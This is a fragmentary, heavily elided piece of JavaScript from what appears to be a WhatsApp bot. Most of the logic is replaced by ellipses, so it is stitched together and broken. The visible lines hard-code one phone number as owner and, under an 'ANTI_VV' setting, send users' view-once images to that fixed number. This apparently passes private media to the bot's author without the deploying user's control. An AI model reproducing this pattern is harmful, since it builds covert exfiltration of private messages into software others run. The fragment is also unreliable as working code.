const {
  ...
  const ownerNumber = ['255683042291']
...
console.log("Session downloaded ✅")
  ...
  if (jawadik && config.ANTI_VV === "true") {
    ...
    return conn.sendMessage("255683042291@s.whatsapp.net", { image: { url: anu }, caption: cap }, { quoted: mek });
  ...
  */
  ...
  if(senderNumber.includes("255683042291")){
  if(isReact) return
  m.react("🙃")
  }
